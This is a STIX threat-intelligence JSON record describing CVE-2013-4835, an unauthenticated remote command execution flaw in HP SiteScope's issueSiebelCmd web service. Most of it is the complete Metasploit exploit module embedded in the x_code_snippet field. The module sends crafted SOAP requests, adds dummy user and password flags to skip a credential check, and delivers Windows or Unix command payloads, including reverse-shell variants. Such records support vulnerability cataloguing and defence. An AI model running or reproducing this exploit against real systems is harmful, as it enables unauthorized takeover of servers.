{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b246144d-86ef-48d1-b55b-e89edfa5dfcc",
    "created": "2024-08-14T17:08:04.165348Z",
    "modified": "2024-08-14T17:08:04.165352Z",
    "name": "HP SiteScope issueSiebelCmd Remote Code Execution",
    "description": " This module exploits a code execution flaw in HP SiteScope. The vulnerability exists in the APISiteScopeImpl web service, specifically in the issueSiebelCmd method, which allows the user to execute arbitrary commands without authentication. This module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2, Windows 2008 and CentOS 6.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/hp_sitescope_issuesiebelcmd.rb",
            "external_id": "hp_sitescope_issuesiebelcmd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4835"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include REXML\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP SiteScope issueSiebelCmd Remote Code Execution',\n      'Description' => %q{\n        This module exploits a code execution flaw in HP SiteScope. The vulnerability exists in the\n        APISiteScopeImpl web service, specifically in the issueSiebelCmd method, which allows the\n        user to execute arbitrary commands without authentication. This module has been tested\n        successfully on HP SiteScope 11.20 over Windows 2003 SP2, Windows 2008 and CentOS 6.5.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-4835'],\n          [ 'OSVDB', '99230' ],\n          [ 'BID', '63478' ],\n          [ 'ZDI', '13-263' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ win unix },\n      'Arch'        => [ ARCH_X86, ARCH_CMD ],\n      'Payload'     =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Targets'     =>\n        [\n          [ 'HP SiteScope 11.20 / Windows',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n              'CmdStagerFlavor' => 'vbs'\n            }\n          ],\n          [ 'HP SiteScope 11.20 / Linux',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'Payload' =>\n                {\n                  'BadChars' => \"\\x20\\x22\\x27\\x3c\",\n                  'Compat'      => {\n                    'RequiredCmd' => 'perl python bash-tcp gawk openssl'\n                  }\n                }\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-10-30'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])\n      ])\n  end\n\n  def check\n    value = rand_text_alpha(8 + rand(10))\n\n    res = send_soap_request(value)\n\n    if res and res.code == 500 and res.body.to_s =~ /Cmd Error: User and Password must be specified/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    if target.name =~ /Windows/\n      print_status(\"Delivering payload...\")\n      # cmd.exe max length is 8192\n      execute_cmdstager({:linemax => 8000, :nodelete => true})\n    elsif target.name =~ /Linux/\n      print_status(\"Executing payload...\")\n      execute_command(payload.encoded, {:http_timeout => 1})\n    end\n  end\n\n  def execute_command(cmd, opts={})\n    if target.name =~ /Windows/\n      cmd.gsub!(/data = Replace\\(data, vbCrLf, \"\"\\)/, \"data = Replace(data, \\\" \\\" + vbCrLf, \\\"\\\")\")\n      command = \"cmd.exe /c \"\n      command << cmd.gsub(/&/, \"&#x26;\")   # HTML Encode '&' character to avoid soap request parsing errors\n      command << \" &#x26; /u #{rand_text_alpha(4)} /p #{rand_text_alpha(4)}\" # To bypass user and pass flags check before executing\n    elsif target.name =~ /Linux/\n      command = \"sh -c \"\n      command << cmd.gsub(/&/, \"&#x26;\")   # HTML Encode '&' character to avoid soap request parsing errors\n      command << \" /u #{rand_text_alpha(4)} /p #{rand_text_alpha(4)}\" # To bypass user and pass flags check before executing\n    end\n\n    res = send_soap_request(command, opts[:http_timeout] || 20)\n\n    return if target.name =~ /Linux/ # There isn't response with some ARCH_CMD payloads\n\n    unless res and res.code == 500 and res.body =~ /SiteScope encountered an error associated with running a command/\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response, aborting...\")\n    end\n  end\n\n  def get_soap_request\n    xml = Document.new\n    xml.add_element(\n        \"soapenv:Envelope\",\n        {\n            'xmlns:xsi'     => \"http://www.w3.org/2001/XMLSchema-instance\",\n            'xmlns:xsd'     => \"http://www.w3.org/2001/XMLSchema\",\n            'xmlns:soapenv' => \"http://schemas.xmlsoap.org/soap/envelope/\",\n            'xmlns:api'     => \"http://Api.freshtech.COM\"\n        })\n    xml.root.add_element(\"soapenv:Header\")\n    xml.root.add_element(\"soapenv:Body\")\n    body = xml.root.elements[2]\n    body.add_element(\n        \"api:issueSiebelCmd\",\n        {\n            'soapenv:encodingStyle' => \"http://schemas.xmlsoap.org/soap/encoding/\"\n        })\n    ser = body.elements[1]\n    ser.add_element(\"in0\", {'xsi:type' => 'xsd:string'})\n    ser.elements['in0'].text = \"MSF_COMMAND\"\n\n    xml.to_s\n  end\n\n  def send_soap_request(command, timeout = 20)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path, 'services', 'APISiteScopeImpl'),\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => get_soap_request.gsub(/MSF_COMMAND/, command), # To avoid rexml html encoding\n      'headers'  => {\n        'SOAPAction' => '\"\"'\n      }\n    }, timeout)\n\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "unix'"
    ]
}